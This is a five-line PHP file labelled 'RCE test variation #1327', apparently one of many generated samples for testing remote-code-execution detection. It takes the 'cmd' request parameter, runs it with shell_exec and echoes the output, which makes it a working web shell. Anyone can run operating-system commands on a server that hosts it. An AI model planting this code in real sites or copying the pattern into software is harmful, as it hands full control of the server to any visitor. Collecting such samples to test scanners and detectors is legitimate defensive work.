<?php
// RCE test variation #1327
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>